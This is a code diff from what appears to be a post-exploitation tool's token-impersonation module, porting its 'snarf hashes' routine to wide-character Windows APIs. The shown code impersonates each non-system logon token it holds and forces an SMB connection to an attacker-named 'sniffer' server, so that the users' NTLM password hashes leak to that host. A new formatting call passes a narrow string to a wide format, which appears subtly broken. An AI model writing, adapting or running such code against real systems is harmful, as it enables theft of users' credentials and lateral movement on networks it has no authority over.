@@ -19,22 +19,24 @@ DWORD request_incognito_snarf_hashes(Remote *remote, Packet *packet)
 {
 	DWORD num_tokens = 0, i;
 	SavedToken *token_list = NULL;
-	NETRESOURCEA nr;
+	NETRESOURCEW nr;
 	HANDLE saved_token;
 	TOKEN_PRIVS token_privs;
-	char conn_string[BUF_SIZE] = "", domain_name[BUF_SIZE] = "", *smb_sniffer_ip = NULL,
-		return_value[BUF_SIZE] = "", temp[BUF_SIZE] = "";
+	wchar_t conn_string[BUF_SIZE] = L"", domain_name[BUF_SIZE] = L"",
+		return_value[BUF_SIZE] = L"", temp[BUF_SIZE] = L"";
 
 	Packet *response = packet_create_response(packet);
-	smb_sniffer_ip = packet_get_tlv_value_string(packet, TLV_TYPE_INCOGNITO_SERVERNAME);
+	char *smb_sniffer_ip = packet_get_tlv_value_string(packet, TLV_TYPE_INCOGNITO_SERVERNAME);
 
 	// Initialise net_resource structure (essentially just set ip to that of smb_sniffer)
-   	if (_snprintf(conn_string, sizeof(conn_string), "\\\\%s", smb_sniffer_ip) == -1)
-		conn_string[sizeof(conn_string)-1] = '\0';
-	nr.dwType    		 = RESOURCETYPE_ANY;
-   	nr.lpLocalName       = NULL;
-   	nr.lpProvider        = NULL;
-   	nr.lpRemoteName 	 = (LPSTR)conn_string;
+	if (_snwprintf(conn_string, BUF_SIZE, L"\\\\%s", smb_sniffer_ip) == -1)
+	{
+		conn_string[BUF_SIZE - 1] = '\0';
+	}
+	nr.dwType       = RESOURCETYPE_ANY;
+	nr.lpLocalName  = NULL;
+	nr.lpProvider   = NULL;
+	nr.lpRemoteName = conn_string;
 
 	// Save current thread token if one is currently being impersonated
 	if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, TRUE, &saved_token))
@@ -54,16 +56,17 @@ DWORD request_incognito_snarf_hashes(Remote *remote, Packet *packet)
 		{
 			get_domain_from_token(token_list[i].token, domain_name, BUF_SIZE);
 			// If token is not "useless" local account connect to sniffer
-			if (_stricmp(domain_name, "NT AUTHORITY"))
+			// XXX This may need some expansion to support other languages
+			if (_wcsicmp(domain_name, L"NT AUTHORITY"))
 			{
 				// Impersonate token
 				ImpersonateLoggedOnUser(token_list[i].token);
 
 				// Cancel previous connection to ensure hashes are sent and existing connection isn't reused
-				WNetCancelConnection2A(nr.lpRemoteName, 0, TRUE);
+				WNetCancelConnection2W(nr.lpRemoteName, 0, TRUE);
 
 				// Connect to smb sniffer
-				if (!WNetAddConnection2A(&nr, NULL, NULL, 0))
+				if (!WNetAddConnection2W(&nr, NULL, NULL, 0))
 				{
 					// Revert to primary token
 					RevertToSelf();
